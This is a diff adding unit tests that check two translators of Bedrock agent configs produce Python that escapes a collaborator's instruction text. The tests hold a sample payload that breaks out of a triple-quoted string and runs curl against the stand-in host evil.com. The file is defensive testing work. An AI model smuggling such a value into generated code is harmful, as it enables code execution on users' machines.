@@ -172,6 +172,88 @@ describe('StrandsTranslator', () => {
   });
 });
 
+function makeCollaboratorConfig(collaborationInstruction: string): BedrockAgentConfig {
+  const collaboratorAgentConfig = makeSimpleAgentConfig();
+  return makeSimpleAgentConfig({
+    agent: {
+      ...makeSimpleAgentConfig().agent,
+      agentCollaboration: 'SUPERVISOR_ROUTER',
+    },
+    collaborators: [
+      {
+        agent: { ...collaboratorAgentConfig.agent, agentName: 'collab-agent' },
+        action_groups: [],
+        knowledge_bases: [],
+        collaborators: [],
+        collaboratorName: 'collab',
+        collaborationInstruction,
+      },
+    ],
+  });
+}
+
+function extractToolFunction(mainPyContent: string): string {
+  const start = mainPyContent.indexOf('@tool');
+  const end = mainPyContent.indexOf('\n\n\n', start);
+  return mainPyContent.slice(start, end);
+}
+
+describe('StrandsTranslator - collaborationInstruction injection safety', () => {
+  it('neutralizes triple-quote injection in collaborationInstruction', () => {
+    const payload = '"""\nimport subprocess; subprocess.run(["curl","evil.com"])\n"""';
+    const config = makeCollaboratorConfig(payload);
+    const translator = new StrandsTranslator(config, {
+      agentConfig: config,
+      enableMemory: false,
+      memoryOption: 'none',
+      enableObservability: false,
+    });
+    const { mainPyContent } = translator.translate();
+    expect(extractToolFunction(mainPyContent)).toMatchSnapshot();
+  });
+
+  it('preserves backslashes in collaborationInstruction without doubling', () => {
+    const payload = 'C:\\path\\to\\file and regex \\d+';
+    const config = makeCollaboratorConfig(payload);
+    const translator = new StrandsTranslator(config, {
+      agentConfig: config,
+      enableMemory: false,
+      memoryOption: 'none',
+      enableObservability: false,
+    });
+    const { mainPyContent } = translator.translate();
+    expect(extractToolFunction(mainPyContent)).toMatchSnapshot();
+  });
+});
+
+describe('LangGraphTranslator - collaborationInstruction injection safety', () => {
+  it('neutralizes triple-quote injection in collaborationInstruction', () => {
+    const payload = '"""\nimport subprocess; subprocess.run(["curl","evil.com"])\n"""';
+    const config = makeCollaboratorConfig(payload);
+    const translator = new LangGraphTranslator(config, {
+      agentConfig: config,
+      enableMemory: false,
+      memoryOption: 'none',
+      enableObservability: false,
+    });
+    const { mainPyContent } = translator.translate();
+    expect(extractToolFunction(mainPyContent)).toMatchSnapshot();
+  });
+
+  it('preserves backslashes in collaborationInstruction without doubling', () => {
+    const payload = 'C:\\path\\to\\file and regex \\d+';
+    const config = makeCollaboratorConfig(payload);
+    const translator = new LangGraphTranslator(config, {
+      agentConfig: config,
+      enableMemory: false,
+      memoryOption: 'none',
+      enableObservability: false,
+    });
+    const { mainPyContent } = translator.translate();
+    expect(extractToolFunction(mainPyContent)).toMatchSnapshot();
+  });
+});
+
 describe('LangGraphTranslator', () => {
   it('generates valid LangChain/LangGraph Python code for a simple agent', () => {
     const config = makeSimpleAgentConfig();
